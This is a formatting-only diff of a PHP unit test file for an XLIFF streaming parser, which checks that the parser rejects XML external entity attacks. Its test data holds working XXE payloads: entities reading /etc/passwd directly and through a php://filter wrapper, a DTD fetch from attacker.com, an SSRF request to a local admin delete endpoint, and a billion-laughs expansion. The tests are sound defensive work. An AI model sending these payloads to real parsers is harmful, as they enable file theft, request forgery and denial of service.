@@ -1,11 +1,11 @@
 <?php
 
-declare(strict_types=1);
-
 /*
  * SPDX-License-Identifier: GPL-2.0-or-later
  * SPDX-FileCopyrightText: Netresearch DTT GmbH
  */
+
+declare(strict_types=1);
 
 namespace Netresearch\NrXliffStreaming\Tests\Unit\Parser;
 
@@ -17,7 +17,7 @@ use TYPO3\CMS\Core\Utility\GeneralUtility;
 use TYPO3\TestingFramework\Core\Unit\UnitTestCase;
 
 /**
- * XXE (XML External Entity) Attack Protection Tests
+ * XXE (XML External Entity) Attack Protection Tests.
  *
  * Tests that the streaming parser is protected against XXE attacks:
  * - CWE-611: Improper Restriction of XML External Entity Reference
@@ -55,20 +55,20 @@ final class XliffStreamingParserXXETest extends UnitTestCase
     public function xxePayloadWithFileReadIsBlocked(): void
     {
         $xxePayload = <<<'XML'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE xliff [
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
-    <file target-language="en" datatype="plaintext" original="messages">
-        <body>
-            <trans-unit id="xxe.test">
-                <source>&xxe;</source>
-            </trans-unit>
-        </body>
-    </file>
-</xliff>
-XML;
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE xliff [
+                <!ENTITY xxe SYSTEM "file:///etc/passwd">
+            ]>
+            <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+                <file target-language="en" datatype="plaintext" original="messages">
+                    <body>
+                        <trans-unit id="xxe.test">
+                            <source>&xxe;</source>
+                        </trans-unit>
+                    </body>
+                </file>
+            </xliff>
+            XML;
 
         // LIBXML_NONET blocks external entities, causing parsing to fail
         // This is expected and secure behavior - fail-safe, not fail-open
@@ -83,20 +83,20 @@ XML;
     public function xxePayloadWithNetworkAccessIsBlocked(): void
     {
         $xxePayload = <<<'XML'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE xliff [
-    <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
-]>
-<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
-    <file target-language="en" datatype="plaintext" original="messages">
-        <body>
-            <trans-unit id="network.test">
-                <source>&xxe;</source>
-            </trans-unit>
-        </body>
-    </file>
-</xliff>
-XML;
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE xliff [
+                <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
+            ]>
+            <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+                <file target-language="en" datatype="plaintext" original="messages">
+                    <body>
+                        <trans-unit id="network.test">
+                            <source>&xxe;</source>
+                        </trans-unit>
+                    </body>
+                </file>
+            </xliff>
+            XML;
 
         // LIBXML_NONET flag prevents network access, causing parsing to fail
         $this->expectException(InvalidXliffException::class);
@@ -109,23 +109,23 @@ XML;
     public function billionLaughsAttackIsMitigated(): void
     {
         $billionLaughs = <<<'XML'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE xliff [
-    <!ENTITY lol "lol">
-    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-]>
-<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
-    <file target-language="en" datatype="plaintext" original="messages">
-        <body>
-            <trans-unit id="dos.test">
-                <source>&lol3;</source>
-            </trans-unit>
-        </body>
-    </file>
-</xliff>
-XML;
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE xliff [
+                <!ENTITY lol "lol">
+                <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+                <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+                <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+            ]>
+            <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+                <file target-language="en" datatype="plaintext" original="messages">
+                    <body>
+                        <trans-unit id="dos.test">
+                            <source>&lol3;</source>
+                        </trans-unit>
+                    </body>
+                </file>
+            </xliff>
+            XML;
 
         // The entities are not substituted, and this small payload stays below
         // libxml2's amplification limit, so the reader passes it on; re-parsing
@@ -192,7 +192,7 @@ XML;
         // content never reaches a yielded unit.
         $sources = array_column($this->collectUnitsOrInvalidXliff($xliff), 'source');
 
-        self::assertSame([], array_filter($sources, static fn(string $source): bool => str_contains($source, 'LOADED-FROM')));
+        self::assertSame([], array_filter($sources, static fn (string $source): bool => str_contains($source, 'LOADED-FROM')));
     }
 
     #[Test]
@@ -215,20 +215,20 @@ XML;
     public function xxePayloadWithPhpWrapperIsBlocked(): void
     {
         $phpWrapper = <<<'XML'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE xliff [
-    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-]>
-<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
-    <file target-language="en" datatype="plaintext" original="messages">
-        <body>
-            <trans-unit id="php.test">
-                <source>&xxe;</source>
-            </trans-unit>
-        </body>
-    </file>
-</xliff>
-XML;
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE xliff [
+                <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+            ]>
+            <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+                <file target-language="en" datatype="plaintext" original="messages">
+                    <body>
+                        <trans-unit id="php.test">
+                            <source>&xxe;</source>
+                        </trans-unit>
+                    </body>
+                </file>
+            </xliff>
+            XML;
 
         // PHP wrapper access is blocked by LIBXML_NONET
         $this->expectException(InvalidXliffException::class);
@@ -241,20 +241,20 @@ XML;
     public function ssrfAttackViaXxeIsBlocked(): void
     {
         $ssrfPayload = <<<'XML'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE xliff [
-    <!ENTITY xxe SYSTEM "http://localhost:8080/admin/delete-all">
-]>
-<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
-    <file target-language="en" datatype="plaintext" original="messages">
-        <body>
-            <trans-unit id="ssrf.test">
-                <source>&xxe;</source>
-            </trans-unit>
-        </body>
-    </file>
-</xliff>
-XML;
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE xliff [
+                <!ENTITY xxe SYSTEM "http://localhost:8080/admin/delete-all">
+            ]>
+            <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+                <file target-language="en" datatype="plaintext" original="messages">
+                    <body>
+                        <trans-unit id="ssrf.test">
+                            <source>&xxe;</source>
+                        </trans-unit>
+                    </body>
+                </file>
+            </xliff>
+            XML;
 
         // SSRF via XXE is blocked by LIBXML_NONET, causing parsing to fail
         $this->expectException(InvalidXliffException::class);
@@ -284,7 +284,7 @@ XML;
     private function parseWithoutLibxmlWarnings(string $xliff): array
     {
         $units = [];
-        set_error_handler(static fn(): bool => true, E_WARNING);
+        set_error_handler(static fn (): bool => true, E_WARNING);
         try {
             foreach ($this->xliffStreamingParser->parseTransUnits($xliff) as $unit) {
                 $units[] = $unit;
